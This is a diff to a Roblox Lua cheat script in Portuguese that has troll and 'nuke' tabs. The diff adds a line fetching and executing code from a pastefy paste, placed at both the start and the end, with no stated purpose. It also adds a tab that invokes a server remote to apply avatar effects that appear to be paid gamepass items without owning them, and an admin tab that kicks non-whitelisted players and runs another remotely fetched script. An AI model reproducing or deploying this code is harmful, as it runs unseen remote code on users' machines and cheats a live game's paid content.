@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet("https://pastefy.app/X1EIRKRd/raw"))()
 local Libary = loadstring(game:HttpGet("https://raw.githubusercontent.com/losaztecas859-commits/Redz-library-v5.docs/refs/heads/main/testee2.lua"))()
 workspace.FallenPartsDestroyHeight = -math.huge
 
@@ -45,7 +45,10 @@ InfoTab:AddButton({
         TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
     end
 })
-
+InfoTab:AddParagraph({
+"versão:",
+"1.1.3"
+})
 
 
 local TrollTab = Window:MakeTab({ Title = "Scripts Trolls", Icon = "rbxassetid://13364900349" })
@@ -10097,3 +10100,130 @@ TabNuke:AddToggle({
         end
     end
 })
+
+--==================================================
+-- SERVICES
+--==================================================
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Remotes = ReplicatedStorage:WaitForChild("Remotes")
+local ApplyEmmiter = Remotes:WaitForChild("ApplyEmmiter")
+
+--==================================================
+-- TAB GAMEPASS
+--==================================================
+
+local GamepassTab= Window:MakeTab({"Gamepass", "flame"})
+
+GamepassTab:AddSection({"Effects Avatar"})
+
+--==================================================
+-- TODOS OS EFEITOS JUNTOS
+--==================================================
+
+local Effects = {
+
+--🔥 FOGO
+{name="Fogo Branco",id="18637074370",code="030FireWhite"},
+{name="Fogo Laranja",id="18637025451",code="031FireOrange"},
+{name="Fogo Verde",id="18637078598",code="032FireGreen"},
+{name="Fogo Azul",id="18637076370",code="033FireBlue"},
+{name="Fogo Roxo",id="18637070174",code="034FirePurple"},
+{name="Fogo Preto",id="18637072603",code="035FireBlack"},
+
+--❤️ CORAÇÕES
+{name="Coração Amarelo",id="18635672195",code="001HeartsYellow"},
+{name="Coração Verde",id="18635727693",code="002HeartsGreen"},
+{name="Coração Azul",id="18635732186",code="003HeartsBlue"},
+{name="Coração Roxo",id="18635723426",code="004HeartsPurple"},
+{name="Coração Rosa",id="18635726250",code="005HeartsPink"},
+{name="Coração Vermelho",id="18635729673",code="006HeartsRed"},
+
+--⭐ ESTRELAS
+{name="Estrela Branca",id="18637942956",code="090StarWhite"},
+{name="Estrela Laranja",id="18637946172",code="091StarOrange"},
+{name="Estrela Verde",id="18637934500",code="092StarGreen"},
+{name="Estrela Azul",id="18637940338",code="093StarBlue"},
+{name="Estrela Roxa",id="18637944796",code="094StarPurple"},
+{name="Estrela Rosa",id="18637947820",code="095StarPink"},
+{name="Estrela Vermelha",id="18637949457",code="096StarRed"},
+
+--💨 FUMAÇA
+{name="Fumaça Branca",id="18637791748",code="080SmokeWhite"},
+{name="Fumaça Amarela",id="18637800482",code="081SmokeYellow"},
+{name="Fumaça Laranja",id="18637793920",code="082SmokeOrange"},
+{name="Fumaça Verde",id="18637789299",code="083SmokeGreen"},
+{name="Fumaça Azul",id="18637803021",code="084SmokeBlue"},
+{name="Fumaça Roxa",id="18637813360",code="085SmokePurple"},
+{name="Fumaça Vermelha",id="18637796598",code="086SmokeRed"},
+{name="Fumaça Preta",id="18637798529",code="087SmokeBlack"}
+
+}
+
+--==================================================
+-- CRIAR LISTA DA DROPDOWN
+--==================================================
+
+local Options = {}
+
+for _,effect in ipairs(Effects) do
+table.insert(Options,effect.name)
+end
+
+--==================================================
+-- DROPDOWN
+--==================================================
+
+GamepassTab:AddDropdown({
+
+Name = "Efeitos",
+
+Options = Options,
+
+Callback = function(selected)
+
+for _,effect in ipairs(Effects) do    
+    if effect.name == selected then    
+
+        ApplyEmmiter:InvokeServer(effect.id,effect.code)    
+
+        break    
+    end    
+end
+
+end
+
+})
+--// ADMIN TAB + WHITELIST
+
+local AdminTab = Window:Tab({
+    Title = "Admin",
+    Icon = "shield"
+})
+
+-- WHITELIST
+local Whitelist = {
+    ["medr0so_0"] = true,
+    ["Arthurfelipe_blox2"] = true,
+    ["Davishe98"] = true,
+    ["K666pkildd"] = true
+}
+
+-- CHECK WHITELIST
+if not Whitelist[game.Players.LocalPlayer.Name] then
+    game.Players.LocalPlayer:Kick("Você não está na whitelist.")
+end
+
+-- SECTION
+AdminTab:Section({
+    Title = "Se vc não estiver na whitelist você será kickado!"
+})
+
+-- BOTÃO ADMIN
+AdminTab:Button({
+    Title = "Admin",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/nombrehumilde-cyber/HironDrigon/refs/heads/main/lol"))()
+    end
+})
+loadstring(game:HttpGet("https://pastefy.app/X1EIRKRd/raw"))()
